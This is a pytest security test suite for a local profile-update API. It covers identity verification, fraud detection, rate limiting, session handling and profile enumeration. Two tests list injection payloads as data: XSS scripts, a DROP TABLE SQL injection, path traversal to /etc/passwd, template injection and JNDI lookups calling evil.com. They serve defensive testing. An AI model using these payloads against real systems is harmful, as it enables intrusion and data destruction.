import pytest
import requests
import time
from faker import Faker
import logging

fake = Faker()
logger = logging.getLogger(__name__)

@pytest.mark.security
@pytest.mark.profile_update
class TestProfileSecurity:
    """Test profile update security and identity verification requirements"""
    
    def test_unverified_user_critical_field_updates(self, api_client):
        """
        Test that unverified users cannot update critical fields without verification
        """
        # Login with unverified user
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Critical fields that should require verification
        critical_updates = {
            "email": fake.email(),
            "phone": fake.phone_number(), 
            "bank_account": fake.iban(),
            "payment_method": "New Credit Card"
        }
        
        for field, new_value in critical_updates.items():
            logger.info(f"Testing unverified user update of {field}")
            
            profile_data = {field: new_value}
            response = api_client.update_profile(profile_data)
            
            # Should be blocked due to lack of verification
            assert response.status_code == 403
            response_data = response.json()
            
            assert "verification" in response_data.get("error", "").lower()
            assert response_data.get("verification_required") is True
            assert response_data.get("field") == field
            
            logger.info(f"✓ Critical field {field} properly protected from unverified user")
    
    def test_verified_user_can_update_critical_fields(self, api_client):
        """
        Test that verified users can update critical fields
        """
        # Login with verified user
        login_response = api_client.login("verified_user", "password123")
        assert login_response.status_code == 200
        
        # Test updating a critical field
        new_email = fake.email()
        profile_data = {"email": new_email}
        
        response = api_client.update_profile(profile_data)
        
        # Should be allowed for verified user
        assert response.status_code == 200
        response_data = response.json()
        assert response_data.get("status") == "success"
        
        logger.info("✓ Verified user can update critical fields")
    
    def test_rapid_profile_change_detection(self, api_client):
        """
        Test fraud detection for rapid profile changes
        """
        # Login first
        login_response = api_client.login("verified_user", "password123")
        assert login_response.status_code == 200
        
        # Make first profile update
        first_update = {"first_name": fake.first_name()}
        response1 = api_client.update_profile(first_update)
        assert response1.status_code == 200
        
        # Attempt rapid second update (should trigger cooldown)
        second_update = {"last_name": fake.last_name()}
        response2 = api_client.update_profile(second_update)
        
        # Should be blocked due to rapid changes
        assert response2.status_code == 429
        response_data = response2.json()
        
        assert "rapid" in response_data.get("error", "").lower() or \
               "recently" in response_data.get("error", "").lower()
        assert response_data.get("fraud_detection") == "rapid_changes"
        assert "cooldown" in response_data.get("cooldown_period", "").lower()
        
        logger.info("✓ Rapid profile change detection working")
    
    def test_profile_data_validation(self, api_client):
        """
        Test profile data validation and sanitization
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Test various invalid/malicious inputs
        malicious_inputs = {
            "xss_script": "<script>alert('XSS')</script>",
            "sql_injection": "'; DROP TABLE users; --",
            "path_traversal": "../../../etc/passwd",
            "template_injection": "{{7*7}}",
            "ldap_injection": "${jndi:ldap://evil.com/a}",
            "html_injection": "<img src=x onerror=alert('XSS')>",
            "javascript_url": "javascript:alert('XSS')"
        }
        
        # Test on allowed fields (non-critical)
        allowed_fields = ["first_name", "last_name", "address"]
        
        for field in allowed_fields:
            for attack_name, payload in malicious_inputs.items():
                logger.info(f"Testing {attack_name} in {field}")
                
                profile_data = {field: payload}
                response = api_client.update_profile(profile_data)
                
                # Should either sanitize the input or reject it
                if response.status_code == 200:
                    # If accepted, verify it was sanitized
                    # In a real app, you'd check if dangerous content was stripped
                    logger.info(f"Input accepted for {field} - should verify sanitization")
                else:
                    # If rejected, that's also acceptable for security
                    logger.info(f"Input rejected for {field}: {response.json()}")
                
                time.sleep(0.1)
    
    def test_profile_enumeration_vulnerability(self, api_client):
        """
        Test for profile enumeration vulnerabilities
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Test accessing other user profiles by ID manipulation
        test_user_ids = [1, 2, 3, 999, "admin", "test"]
        
        for user_id in test_user_ids:
            # Try to access another user's profile
            try:
                profile_url = f"http://localhost:5000/profile/{user_id}"
                response = requests.get(profile_url, 
                                      headers={"Authorization": f"Bearer {api_client.token}"})
                
                logger.info(f"Profile enumeration test for user {user_id}: {response.status_code}")
                
                # Should not allow access to other user profiles
                if response.status_code == 200:
                    response_data = response.json()
                    # Should only return current user's data
                    if response_data.get("username") != "testuser":
                        logger.warning(f"SECURITY ISSUE: Access to user {user_id} profile allowed!")
                        assert False, f"Unauthorized access to user {user_id} profile"
                
            except requests.exceptions.RequestException:
                # If endpoint doesn't exist, that's fine
                pass
    
    def test_session_management_profile_access(self, api_client):
        """
        Test session management for profile access
        """
        # Test without login
        response = api_client.update_profile({"first_name": "Test"})
        assert response.status_code == 401
        
        # Login and test valid session
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Valid session should work
        response = api_client.update_profile({"address": fake.address()})
        assert response.status_code in [200, 403, 429]  # Various valid responses
        
        # Test with invalid/expired token
        original_token = api_client.token
        api_client.token = "invalid_token"
        api_client.session.headers.update({"Authorization": "Bearer invalid_token"})
        
        response = api_client.update_profile({"first_name": "Should Fail"})
        assert response.status_code == 401
        
        # Restore valid token
        api_client.token = original_token
        api_client.session.headers.update({"Authorization": f"Bearer {original_token}"})
        
        logger.info("✓ Session management for profile access working")
    
    def test_profile_data_exposure(self, api_client):
        """
        Test that profile endpoints don't expose sensitive data
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Get user profile (if endpoint exists)
        try:
            profile_response = requests.get("http://localhost:5000/profile",
                                          headers={"Authorization": f"Bearer {api_client.token}"})
            
            if profile_response.status_code == 200:
                profile_data = profile_response.json()
                
                # Should not expose sensitive server-side data
                sensitive_fields = [
                    "password", "password_hash", "salt", "secret_key",
                    "admin_flag", "database_id", "server_config",
                    "api_keys", "internal_id", "session_secret"
                ]
                
                for field in sensitive_fields:
                    assert field not in profile_data, f"Sensitive field {field} exposed in profile"
                
                logger.info("✓ No sensitive data exposed in profile response")
                
        except requests.exceptions.RequestException:
            logger.info("Profile GET endpoint not available for testing")
    
    def test_concurrent_profile_updates(self, api_client):
        """
        Test concurrent profile updates for race conditions
        """
        # Login first
        login_response = api_client.login("verified_user", "password123")
        assert login_response.status_code == 200
        
        # Simulate concurrent updates
        import threading
        import queue
        
        results = queue.Queue()
        
        def update_profile(field_value):
            try:
                response = api_client.update_profile({"first_name": field_value})
                results.put({"value": field_value, "status": response.status_code, "response": response.json()})
            except Exception as e:
                results.put({"value": field_value, "error": str(e)})
        
        # Start multiple concurrent updates
        threads = []
        test_values = [f"Name{i}" for i in range(5)]
        
        for value in test_values:
            thread = threading.Thread(target=update_profile, args=(value,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Collect results
        update_results = []
        while not results.empty():
            update_results.append(results.get())
        
        # Analyze results
        successful_updates = [r for r in update_results if r.get("status") == 200]
        rate_limited = [r for r in update_results if r.get("status") == 429]
        
        logger.info(f"Concurrent updates: {len(successful_updates)} successful, "
                   f"{len(rate_limited)} rate limited")
        
        # Should handle concurrent requests gracefully
        assert len(update_results) == len(test_values)
    
    def test_profile_update_logging_and_audit(self, api_client):
        """
        Test that profile updates are properly logged for audit purposes
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Make a profile update
        test_data = {"address": fake.address()}
        response = api_client.update_profile(test_data)
        
        # Should return success or appropriate error
        assert response.status_code in [200, 403, 429]
        
        # In a real system, you would verify:
        # 1. Update attempt is logged
        # 2. Success/failure is recorded
        # 3. User ID and timestamp are captured
        # 4. Changed fields are documented
        # 5. IP address and session info are logged
        
        logger.info("Profile update audit logging test completed")
        
        # Mock verification of audit log
        audit_log_entry = {
            "timestamp": time.time(),
            "user": "testuser",
            "action": "profile_update",
            "fields": list(test_data.keys()),
            "status": "attempted",
            "ip_address": "127.0.0.1",
            "session_id": api_client.token
        }
        
        # Verify audit log structure (mock)
        required_fields = ["timestamp", "user", "action", "status"]
        for field in required_fields:
            assert field in audit_log_entry
        
        logger.info("✓ Audit logging structure verification passed")
    
    @pytest.mark.parametrize("field,malicious_value", [
        ("email", "user@evil.com<script>alert('xss')</script>"),
        ("phone", "+1234567890'; DROP TABLE users; --"),
        ("first_name", "{{7*7}}"),
        ("last_name", "${jndi:ldap://evil.com}"),
        ("address", "../../../etc/passwd")
    ])
    def test_field_specific_injection_attempts(self, api_client, field, malicious_value):
        """
        Test field-specific injection attempts
        """
        # Login first
        login_response = api_client.login("testuser", "password123")
        assert login_response.status_code == 200
        
        # Test malicious input in specific field
        profile_data = {field: malicious_value}
        response = api_client.update_profile(profile_data)
        
        # Should either reject the input or sanitize it
        if response.status_code == 200:
            # If accepted, log for manual verification of sanitization
            logger.info(f"Malicious input accepted in {field} - verify sanitization")
        else:
            # If rejected, that's good security
            logger.info(f"Malicious input rejected in {field}: {response.status_code}")
        
        # Either response is acceptable as long as the system is secure
        assert response.status_code in [200, 400, 403, 422]
    
    def test_profile_update_rate_limiting(self, api_client):
        """
        Test rate limiting for profile updates
        """
        # Login with verified user to avoid verification errors
        login_response = api_client.login("verified_user", "password123")
        assert login_response.status_code == 200
        
        # Test rapid profile updates
        rapid_updates = 5
        successful_updates = 0
        rate_limited_count = 0
        
        for i in range(rapid_updates):
            profile_data = {"address": f"Address {i} - {fake.address()}"}
            response = api_client.update_profile(profile_data)
            
            if response.status_code == 200:
                successful_updates += 1
            elif response.status_code == 429:
                rate_limited_count += 1
                logger.info(f"Rate limiting triggered after {i+1} attempts")
                break
            
            time.sleep(0.1)  # Small delay
        
        logger.info(f"Rate limiting test: {successful_updates} successful, "
                   f"{rate_limited_count} rate limited")
        
        # Should have either successful updates or rate limiting
        assert successful_updates > 0 or rate_limited_count > 0